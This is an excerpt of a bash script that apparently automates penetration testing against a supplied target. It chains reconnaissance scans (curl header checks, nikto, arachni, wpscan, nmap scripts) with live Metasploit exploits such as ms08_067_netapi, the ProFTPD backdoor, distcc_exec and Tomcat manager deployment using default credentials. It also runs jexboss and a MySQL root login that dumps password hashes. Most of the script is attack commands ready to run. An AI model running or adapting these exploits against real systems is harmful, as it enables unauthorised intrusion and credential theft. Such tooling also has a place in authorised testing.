  echo -e "${GREEN}====================================================================================${RESET}"
  curl --connect-timeout 1 -I -s -R https://$TARGET >>$LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo -e "$BLUE+ -- --=[Checking if X-Content options are enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-Content' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking if X-Frame options are enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-Frame' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking if X-XSS-Protection header is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i 'X-XSS' | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking HTTP methods on $TARGET...${RESET} $ORANGE" 
  curl -s --insecure -I -X OPTIONS https://$TARGET | grep Allow >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking if TRACE method is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I -X TRACE https://$TARGET | grep TRACE >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for META tags on $TARGET...${RESET} $ORANGE"
 curl -s --insecure https://$TARGET | egrep -i meta --color=auto | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for open proxy on $TARGET...${RESET} $ORANGE"
  curl -x https://$TARGET:443 -L https://google.com -s --insecure | tail -n 10 >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Enumerating software on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Server:|X-Powered|ASP|JSP|PHP|.NET" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking if Strict-Transport-Security is enabled on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET/ | egrep -i "Strict-Transport-Security" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for Flash cross-domain policy on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/crossdomain.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for Silverlight cross-domain policy on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/clientaccesspolicy.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for HTML5 cross-origin resource sharing on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Access-Control-Allow-Origin" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Retrieving robots.txt on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/robots.txt | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Retrieving sitemap.xml on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/sitemap.xml | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking cookie attributes on $TARGET...${RESET} $ORANGE"
  curl -s --insecure -I https://$TARGET | egrep -i "Cookie:" | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "$BLUE+ -- --=[Checking for ASP.NET Detailed Errors on $TARGET...${RESET} $ORANGE"
  curl -s --insecure https://$TARGET/%3f.jsp | egrep -i 'Error|Exception' | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  curl -s --insecure https://$TARGET/test.aspx -L | egrep -i 'Error|Exception|System.Web.' | tail -n 10  >> $LOG_DIR/$TARGET.headers-https.txt 2>&1
  echo ""
  echo -e "${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED GATHERING SSL/TLS INFO ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/sslcheck.py --xml $LOG_DIR/$TARGET.sslcheck_443.xml $TARGET -port 443 2>&1
  sslscan --no-failed $TARGET  >> $LOG_DIR/$TARGET.sslscan.txt 2>&1
  echo ""
  ##echo -e "${GREEN}====================================================================================${RESET}"
  ##echo -e "$RED SAVING SCREENSHOTS ${RESET}"
  ##echo -e "${GREEN}====================================================================================${RESET}"
  ##cutycapt --url=https://$TARGET --out=$LOG_DIR/$TARGET-port443.jpg 2>&1
  echo -e "$RED[+]${RESET} Screenshot saved to $LOG_DIR/$TARGET-port443.jpg"
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  nikto -h https://$TARGET -Format xml -o $LOG_DIR/$TARGET.nikto_443.xml 2>&1  
  arachni --report-save-path=$LOG_DIR/ --output-only-positives --checks=active/* https://$TARGET  > test.arachni.log 2>&1
  arachni_reporter $LOG_DIR/*.afr --report=xml:outfile=$LOG_DIR/$TARGET-http_443.xml 2>&1
  #cat $LOG_DIR/$TARGET-http_443.xml |grep -v Arachni | grep -v Author | grep -v Website | grep -v Documentation  
  echo -e "${GREEN}====================================================================================${RESET}"
    echo -e "$RED RUNNING WORDPRESS VULNERABILITY SCAN ${RESET}"
    echo -e "${GREEN}====================================================================================${RESET}"
    wpscan --url https://$TARGET --batch --disable-tls-checks > $LOG_DIR/$TARGET.wpscanhttps.txt 2>&1
    echo ""
    wpscan --url https://$TARGET/wp-admin/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscanhttps.txt 2>&1
    wpscan --url https://$TARGET/wordpress/ --batch --disable-tls-checks >> $LOG_DIR/$TARGET.wpscanhttps.txt 2>&1
...
#  msfconsole -x "use exploit/linux/samba/chain_reply; show options; run; exit -y; exit;"
  ...
  echo -e "$ORANGE ###################################################### ${RESET}"
  msfconsole -x "use windows/smb/ms08_067_netapi; setg RPORT 445; setg RHOST "$TARGET"; show options; run -z; exit -y; exit;" # >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e ""
  echo -e "$ORANGE ###################################################### ${RESET}"
...
then
  ...
  nmap -A -sV -Pn  -p 512 --script=rexec* $TARGET -oX $LOG_DIR/$TARGET.rexec.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV  -Pn -p 513 --script=rlogin* $TARGET -oX $LOG_DIR/$TARGET.rlogin.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap $TARGET 514 -A > $LOG_DIR/$TARGET.amap.txt >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap $TARGET 623 -A >> $LOG_DIR/$TARGET.amap.txt  >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  nmap -A -sV -Pn  --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 623 $TARGET -oX $LOG_DIR/$TARGET.intel.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap $TARGET 624 -A >> $LOG_DIR/$TARGET.amap.txt >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  nmap -A -sV -Pn  --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 624 $TARGET -oX $LOG_DIR/$TARGET.intel2.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap $TARGET 1099 -A >> $LOG_DIR/$TARGET.amap.txt >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  nmap -A -sV -Pn  -p 1099 --script=rmi-* $TARGET -oX $LOG_DIR/$TARGET.rmi.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use auxiliary/gather/java_rmi_registry; set RHOST "$TARGET"; run;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  msfconsole -x "use auxiliary/scanner/misc/java_rmi_server; set RHOST "$TARGET"; run;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=ms-sql* -p 1433 $TARGET -oX $LOG_DIR/$TARGET.ms-sql.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=nfs* -p 2049 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  rpcinfo -p $TARGET > $LOG/$CUSTOMER/TARGET.rpcinfo.log 2>&1
  showmount -e $TARGET > $LOG/$CUSTOMER/$TARGET.showmount.log 2>&1
  smbclient -L $TARGET -U " "%" "  >> $LOG/$CUSTOMER/$TARGET.smbclient.log
fi
...
then
  ...
  nmap -A -sV -Pn  --script=ftp* -p 2121 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use exploit/unix/ftp/proftpd_133c_backdoor; setg RPORT 2121; setg RPORTS 2121; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; use exploit/unix/ftp/proftpd_133c_backdoor; run; use exploit/freebsd/ftp/proftp_telnet_iac; run; use exploit/linux/ftp/proftp_sreplace; run; exit  " >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn --script=mysql* -p 3306 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;' > $LOG/$CUSTOMER/$TARGET.mysqlclient.log 2>&1
 msfconsole -x "use auxiliary/admin/mysql/mysql_enum; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 3306; setg RPORTS 3306; run; use auxiliary/scanner/mysql/mysql_login; run; use auxiliary/scanner/mysql/mysql_version; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -p 3310 -Pn  -sV  --script clamav-exec $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -p 3128 -Pn  -sV  --script=*proxy* $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=rdp-* -p 3389 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  rdesktop $TARGET &
fi
...
then
  ...
  nmap -A -sV -Pn  --script=distcc-* -p 3632 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto$PORT.xml
  ...
  #echo -e "$RED RUNNING WEB VULNERABILITY SCAN ${RESET}"
  #echo -e "${GREEN}====================================================================================${RESET}"
  arachni --report-save-path=$LOG_DIR --output-only-positives --checks=active/* http://$TARGET:4443  > test.arachni.log 2>&1
...
then
  ...
  nmap -A -sV -Pn --script=pgsql-brute -p 5432 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=vnc* -p 5800 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV  --script=vnc* -p 5900 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=couchdb* -p 5984 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn  --script=x11* -p 6000 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use auxiliary/scanner/x11/open_x11; set RHOSTS "$TARGET"; exploit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
fi
...
then
  ...
  nmap -A -sV -Pn --script=irc* -p 6667 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
...
then
  ...
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8100 $TARGET -oX $LOG_DIR/$TARGET.nmap_8100.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
...
then
  ...
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8080  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8080.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  msfconsole -x "use admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use admin/http/tomcat_administration;setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080; run; use admin/http/tomcat_utf8_traversal; run; use scanner/http/tomcat_enum;run; use scanner/http/tomcat_mgr_login; run; use multi/http/tomcat_mgr_deploy; run; use multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  # EXPERIMENTAL - APACHE STRUTS RCE EXPLOIT
  #msfconsole -x "use exploit/linux/http/apache_struts_rce_2016-3081; setg RHOSTS "$TARGET"; set PAYLOAD linux/x86/read_file; set PATH /etc/passwd; run;"  >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
...
then
  ...
  nikto -h http://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto$PORT.xml
  cutycapt --url=http://$TARGET:8180 --out=$LOG_DIR/$TARGET-port8180.jpg 2>&1
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -p 8180  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8180.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING WEBMIN FILE DISCLOSURE EXPLOIT ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  msfconsole -x "use auxiliary/admin/webmin/file_disclosure; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNING APACHE TOMCAT EXPLOITS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  msfconsole -x "use use auxiliary/admin/http/jboss_bshdeployer; setg RHOST "$TARGET"; run; use auxiliary/admin/http/tomcat_administration;setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; setg RPORT 8080;run; use auxiliary/admin/http/tomcat_utf8_traversal; run; use auxiliary/scanner/http/tomcat_enum;run; use auxiliary/scanner/http/tomcat_mgr_login; run; use auxiliary/multi/http/tomcat_mgr_deploy; run;use auxiliary/multi/http/tomcat_mgr_upload; set USERNAME tomcat; set PASSWORD tomcat; run; exit;" >> $LOG/$CUSTOMER/msfworkspace.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u http://$TARGET:8180 -out $LOG_DIR/$TARGET.jexboss8180.log 2>&1
fi
...
then
  ...
  wafw00f http://$TARGET:8443 > $LOG_DIR/$TARGET.wafw00f8443.txt 2>&1
  echo ""
  ...
  nikto -h https://$TARGET:$PORT -Format xml -o $LOG_DIR/$TARGET.nikto$PORT.xml
  cutycapt --url=https://$TARGET:8443 --out=$LOG_DIR/$TARGET-port8443.jpg 2>&1
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8443  --script=*proxy* $TARGET -oX $LOG_DIR/$TARGET.nmap_8443.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
  python $TOOL_DIR/jexboss/jexboss.py -u https://$TARGET:8443 -out $LOG_DIR/$TARGET.jexboss8443.log 2>&1
fi
...
then
  ...
  nmap -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-cve2017-5638.nse -A -p 8888  $TARGET -oX $LOG_DIR/$TARGET.nmap_8888.xml >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  echo -e "${GREEN}====================================================================================${RESET}"
  echo -e "$RED RUNNING JEXBOSS ${RESET}"
  echo -e "${GREEN}====================================================================================${RESET}"
...
then
  ...
  nmap $TARGET 16992 -A >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
  nmap -A -sV -Pn --script=/usr/share/nmap/scripts/http-vuln-INTEL-SA-00075.nse -p 16992 $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -sV -p 27017 -Pn  --script=mongodb* $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -sV  -p 27018 -Pn  --script=mongodb* $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -sV  -p 27019 -Pn  --script=mongodb* $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
then
  ...
  nmap -sV  -p 28017 -Pn  --script=mongodb* $TARGET >> $LOG/$CUSTOMER/nmaptcp.log 2>&1
fi
...
echo 'server.SERVER_URL = "http://192.168.15.8:5985"'  >> $LOG_DIR/$CustomerName.py
